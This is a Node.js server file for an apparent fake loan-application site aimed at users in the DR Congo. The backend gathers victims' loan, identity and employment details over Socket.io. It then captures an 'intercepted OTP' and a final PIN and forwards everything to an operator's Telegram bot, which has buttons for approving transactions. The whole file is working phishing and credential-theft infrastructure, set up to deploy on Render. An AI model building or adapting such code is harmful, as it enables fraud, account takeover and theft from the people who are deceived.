require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const cors = require('cors');

const botManager = require('./bot_manager');

const app = express();
const server = http.createServer(app);

// Configure Socket.io for Render (CORS is essential)
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

global.io = io; // Link socket globally so botManager can call back rooms

const PORT = process.env.PORT || 3000;
const EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL; 

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Webhook Route for Telegram
app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
    botManager.bot.processUpdate(req.body);
    res.sendStatus(200);
});

// Store user session data
const userSessions = {};

io.on('connection', (socket) => {
    // Generate unique Congo application session tag
    const appId = `COD-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
    
    socket.join(appId);
    console.log(`🔌 Congo User connected: ${appId}`);
    
    // Initialize session data storage for this user
    userSessions[appId] = {
        step1: null,
        step2: null,
        step3: null
    };
    
    // Send AppID back to the frontend right away
    socket.emit('session-ready', { appId: appId });

    // Step 1: Collect loan details (no send to admin yet)
    socket.on('step1', (data) => {
        userSessions[appId].step1 = data;
        console.log(`📝 Step 1 data collected for ${appId}`);
    });

    // Step 2: Collect identity info (no send to admin yet)
    socket.on('step2', (data) => {
        userSessions[appId].step2 = data;
        console.log(`📝 Step 2 data collected for ${appId}`);
    });

    // Step 3: Collect employment info AND send consolidated data to admin
    socket.on('step3', (data) => {
        userSessions[appId].step3 = data;
        console.log(`📝 Step 3 data collected for ${appId}`);
        
        // Send consolidated data to admin after step 3
        botManager.sendConsolidatedData(appId, userSessions[appId]);
    });

    // Step 4: OTP Entry Point (Triggers confirmation/rejection inline buttons)
    socket.on('step4', (data) => {
        botManager.sendToAdmin(appId, "🇨🇩 Step 4: Intercepted OTP", data, true);
    });

    // Step 5: Final PIN Submission (Triggers transaction inline buttons)
    socket.on('step5', (data) => {
        botManager.sendFinalApproval(appId, data.pin);
    });

    socket.on('disconnect', () => {
        console.log(`🔌 User disconnected: ${appId}`);
        delete userSessions[appId];
    });
});

server.listen(PORT, async () => {
    console.log(`🚀 Congo Loan Server running on port ${PORT}`);
    
    // Auto-configure Webhooks on deployment platforms like Render
    if (EXTERNAL_URL) {
        const webhookUrl = `${EXTERNAL_URL}/bot${process.env.BOT_TOKEN}`;
        try {
            await botManager.bot.setWebHook(webhookUrl);
            console.log(`✅ Telegram Webhook set to: ${webhookUrl}`);
        } catch (err) {
            console.error('❌ Webhook Setup Failed:', err.message);
        }
    } else {
        console.warn('⚠️ RENDER_EXTERNAL_URL missing inside environment configs.');
    }
});
